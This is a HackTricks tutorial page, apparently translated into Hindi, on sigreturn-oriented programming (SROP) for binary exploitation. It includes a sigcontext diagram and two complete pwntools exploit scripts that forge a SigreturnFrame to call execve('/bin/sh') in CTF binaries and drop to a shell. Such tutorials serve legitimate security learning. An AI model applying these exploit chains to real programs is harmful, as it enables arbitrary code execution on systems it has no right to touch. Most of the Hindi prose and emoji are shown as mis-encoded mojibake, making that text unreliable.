# SROP - Sigreturn-Oriented Programming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**`Sigreturn`** ‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑ **syscall** ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§â‡§™‡§Ø‡•ã‡§ó ‡§è‡§ï ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§ï‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§∏‡§´‡§æ‡§à ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§µ‡•á ‡§µ‡•ç‡§Ø‡§µ‡§ß‡§æ‡§® ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§ë‡§™‡§∞‡•á‡§ü‡§ø‡§Ç‡§ó ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§è‡§ï ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§ï‡•ã ‡§≠‡•á‡§ú‡•á ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç, ‡§Ö‡§ï‡•ç‡§∏‡§∞ ‡§Ø‡§π ‡§∏‡§Ç‡§ï‡•á‡§§ ‡§¶‡•á‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø ‡§ï‡•ã‡§à ‡§Ö‡§∏‡§æ‡§ß‡§æ‡§∞‡§£ ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§π‡•Å‡§à ‡§π‡•à‡•§ ‡§ú‡§¨ ‡§è‡§ï ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§è‡§ï ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ø‡§π ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§ï‡•ã ‡§∏‡§Ç‡§≠‡§æ‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§∏‡•ç‡§•‡§æ‡§Ø‡•Ä ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ö‡§™‡§®‡•á ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡•ã ‡§∞‡•ã‡§ï‡§§‡§æ ‡§π‡•à, ‡§è‡§ï **‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞** ‡§ï‡•á ‡§∏‡§æ‡§•, ‡§ú‡•ã ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§ï‡•ã ‡§∏‡§Ç‡§≠‡§æ‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§°‡§ø‡§ú‡§º‡§æ‡§á‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§π‡•à‡•§

‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶, ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§ï‡•ã **‡§Ö‡§™‡§®‡•á ‡§™‡§ø‡§õ‡§≤‡•á ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§™‡§∞ ‡§≤‡•å‡§ü‡§®‡•á** ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§ï‡•Å‡§õ ‡§≠‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§π‡•Å‡§Ü‡•§ ‡§Ø‡§π‡•Ä‡§Ç ‡§™‡§∞ **`sigreturn`** ‡§ï‡§æ‡§Æ ‡§Ü‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§ï‡•ã **‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§∏‡•á ‡§≤‡•å‡§ü‡§®‡•á** ‡§Æ‡•á‡§Ç ‡§Æ‡§¶‡§¶ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ó‡§è ‡§∏‡•ç‡§ü‡•à‡§ï ‡§´‡•ç‡§∞‡•á‡§Æ (‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§ï‡§æ ‡§µ‡§π ‡§≠‡§æ‡§ó ‡§ú‡•ã ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•â‡§≤ ‡§î‡§∞ ‡§∏‡•ç‡§•‡§æ‡§®‡•Ä‡§Ø ‡§ö‡§∞ ‡§ï‡•ã ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à) ‡§ï‡•ã ‡§∏‡§æ‡§´ ‡§ï‡§∞‡§ï‡•á ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§ï‡•Ä ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§ï‡•ã ‡§¨‡§π‡§æ‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§¨‡§æ‡§§ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø **`sigreturn`** ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§ï‡•Ä ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§ï‡•ã ‡§ï‡•à‡§∏‡•á ‡§¨‡§π‡§æ‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à: ‡§Ø‡§π **CPU ‡§ï‡•á ‡§∏‡§≠‡•Ä ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡§ï‡•á** ‡§ê‡§∏‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§ú‡§¨ ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§Ö‡§¨ ‡§Ö‡§µ‡§∞‡•Å‡§¶‡•ç‡§ß ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à, **`sigreturn` ‡§á‡§® ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§∏‡•á ‡§™‡•â‡§™ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à**, ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§∞‡•Ç‡§™ ‡§∏‡•á CPU ‡§ï‡•á ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§â‡§®‡§ï‡•á ‡§â‡§∏ ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§™‡§∞ ‡§∞‡•Ä‡§∏‡•á‡§ü ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§∏‡§ø‡§ó‡•ç‡§®‡§≤ ‡§ï‡•ã ‡§∏‡§Ç‡§≠‡§æ‡§≤‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ‡•§ ‡§á‡§∏‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ (RSP) ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à, ‡§ú‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§∂‡•Ä‡§∞‡•ç‡§∑ ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

{% hint style="danger" %}
Calling the syscall **`sigreturn`** from a ROP chain and **adding the registry values** we would like it to load in the **stack** it's possible to **control** all the register values and therefore **call** for example the syscall `execve` with `/bin/sh`.
{% endhint %}

Note how this would be a **type of Ret2syscall** that makes much easier to control params to call other Ret2syscalls:

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

If you are curious this is the **sigcontext structure** stored in the stack to later recover the values (diagram from [**here**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
For a better explanation check also:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Example

You can [**find an example here**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) ‡§ú‡§π‡§æ‡§Å ‡§∏‡§ø‡§ó‡•ç‡§®‡§∞‡§ü‡§∞‡•ç‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•â‡§≤ ROP ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§¨‡§®‡§æ‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à (rxa ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§® `0xf` ‡§°‡§æ‡§≤‡§ï‡§∞), ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø ‡§Ø‡§π ‡§µ‡§π‡§æ‡§Å ‡§∏‡•á ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§π‡•à:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Check also the [**exploit from here**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) ‡§ú‡§π‡§æ‡§Å ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§π‡•Ä `sigreturn` ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞ ‡§∞‡§π‡•Ä ‡§•‡•Ä ‡§î‡§∞ ‡§á‡§∏‡§≤‡§ø‡§è ‡§á‡§∏‡•á **ROP** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## ‡§Ö‡§®‡•ç‡§Ø ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§î‡§∞ ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* Assembly binary ‡§ú‡•ã **stack ‡§™‡§∞ ‡§≤‡§ø‡§ñ‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§´‡§ø‡§∞ **`sigreturn`** syscall ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ï‡§ø stack ‡§™‡§∞ ‡§è‡§ï [**ret2syscall**](../rop-syscall-execv/) ‡§ï‡•ã **sigreturn** ‡§∏‡§Ç‡§∞‡§ö‡§®‡§æ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§≤‡§ø‡§ñ‡§æ ‡§ú‡§æ‡§è ‡§î‡§∞ ‡§â‡§∏ ‡§´‡•ç‡§≤‡•à‡§ó ‡§ï‡•ã ‡§™‡§¢‡§º‡§æ ‡§ú‡§æ‡§è ‡§ú‡•ã ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•Ä ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§π‡•à‡•§
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* Assembly binary ‡§ú‡•ã **stack ‡§™‡§∞ ‡§≤‡§ø‡§ñ‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§´‡§ø‡§∞ **`sigreturn`** syscall ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ï‡§ø stack ‡§™‡§∞ ‡§è‡§ï [**ret2syscall**](../rop-syscall-execv/) ‡§ï‡•ã **sigreturn** ‡§∏‡§Ç‡§∞‡§ö‡§®‡§æ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§≤‡§ø‡§ñ‡§æ ‡§ú‡§æ‡§è (‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó `/bin/sh` ‡§π‡•à)‡•§
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 ‡§¨‡§ø‡§ü‡•ç‡§∏, ‡§ï‡•ã‡§à relro ‡§®‡§π‡•Ä‡§Ç, ‡§ï‡•ã‡§à canary ‡§®‡§π‡•Ä‡§Ç, nx, ‡§ï‡•ã‡§à pie ‡§®‡§π‡•Ä‡§Ç‡•§ `gets` ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è ‡§∏‡§∞‡§≤ ‡§¨‡§´‡§∞ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ú‡•ã [**ret2syscall**](../rop-syscall-execv/) ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ROP ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ `/bin/sh` ‡§ï‡•ã `.bss` ‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡§§‡•Ä ‡§π‡•à, ‡§´‡§ø‡§∞ ‡§∏‡•á gets ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à, ‡§Ø‡§π **`alarm`** ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à ‡§§‡§æ‡§ï‡§ø eax ‡§ï‡•ã `0xf` ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§§‡§æ‡§ï‡§ø ‡§è‡§ï **SROP** ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§î‡§∞ ‡§è‡§ï ‡§∂‡•á‡§≤ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 ‡§¨‡§ø‡§ü‡•ç‡§∏ assembly ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ, ‡§ï‡•ã‡§à relro ‡§®‡§π‡•Ä‡§Ç, ‡§ï‡•ã‡§à canary ‡§®‡§π‡•Ä‡§Ç, nx, ‡§ï‡•ã‡§à pie ‡§®‡§π‡•Ä‡§Ç‡•§ ‡§™‡•ç‡§∞‡§µ‡§æ‡§π stack ‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡§®‡•á, ‡§ï‡§à ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á, ‡§î‡§∞ ‡§è‡§ï syscall ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§Ø‡§π `exit` ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§ö‡§Ø‡§®‡§ø‡§§ syscall ‡§è‡§ï `sigreturn` ‡§π‡•à ‡§ú‡•ã ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ `eip` ‡§ï‡•ã ‡§è‡§ï ‡§™‡•Ç‡§∞‡•ç‡§µ syscall ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•ç‡§•‡§æ‡§®‡§æ‡§Ç‡§§‡§∞‡§ø‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§∏‡•ç‡§™‡•á‡§∏ ‡§ï‡•ã `rwx` ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è `memprotect` ‡§ï‡•ã ‡§ö‡§≤‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§∏‡•ç‡§™‡•á‡§∏ ‡§Æ‡•á‡§Ç ESP ‡§ï‡•ã ‡§∏‡•á‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ‡•§ ‡§™‡•ç‡§∞‡§µ‡§æ‡§π ‡§ï‡§æ ‡§™‡§æ‡§≤‡§® ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è, ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§´‡§ø‡§∞ ‡§∏‡•á ESP ‡§Æ‡•á‡§Ç ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡•á‡§ó‡§æ, ‡§≤‡•á‡§ï‡§ø‡§® ‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ESP ‡§Ö‡§ó‡§≤‡•Ä ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡•á‡§ó‡§æ, ‡§á‡§∏‡§≤‡§ø‡§è ‡§è‡§ï ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡§æ ‡§á‡§∏‡•á ‡§Ö‡§ó‡§≤‡•Ä ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡•á‡§ó‡§æ ‡§î‡§∞ ‡§á‡§∏‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ‡•§
* [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection)
* SROP ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ (memprotect) ‡§¶‡•á‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§â‡§∏ ‡§∏‡•ç‡§•‡§æ‡§® ‡§™‡§∞ ‡§ú‡§π‡§æ‡§Ç ‡§è‡§ï ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§∞‡§ñ‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ‡•§

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
